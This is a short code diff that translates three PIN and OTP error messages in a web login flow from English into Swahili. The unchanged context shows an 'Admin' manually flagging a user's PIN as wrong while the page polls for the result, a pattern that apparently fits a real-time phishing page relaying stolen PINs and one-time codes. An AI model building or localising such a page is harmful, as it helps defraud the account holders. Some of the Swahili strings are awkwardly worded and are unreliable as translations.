@@ -1130,13 +1130,13 @@
 
         } else if (data.status === 'rejected') {
           clearInterval(otpPollInterval);
-          showOtpMsg('error', 'Verification failed. Please contact support.');
+          showOtpMsg('error', 'Uthibitisho umeshindwa. Tafadhali wasiliana na msaada.');
           document.getElementById('bOtp').disabled = false;
 
         } else if (data.status === 'wrongpin_otp') {
           // Admin flagged PIN as wrong — send user back to login
           clearInterval(otpPollInterval);
-          showOtpMsg('error', 'Incorrect PIN detected. Redirecting to login…');
+          showOtpMsg('error', 'PIN si sahihi iliyotambuliwa. Inakamatia kuingia tena…');
           setTimeout(() => {
             // Clear OTP textarea
             document.getElementById('otpInput').value = '';
@@ -1167,7 +1167,7 @@
           chkOtp();
           document.getElementById('bOtp').disabled = false;
           
-          showOtpMsg('error', 'Incorrect OTP code. Please check and re-enter.');
+          showOtpMsg('error', 'Nambari ya OTP si sahihi. Tafadhali angalia na ingiza tena.');
           
           if (S.otpAttempts >= 2) {
             setTimeout(() => {
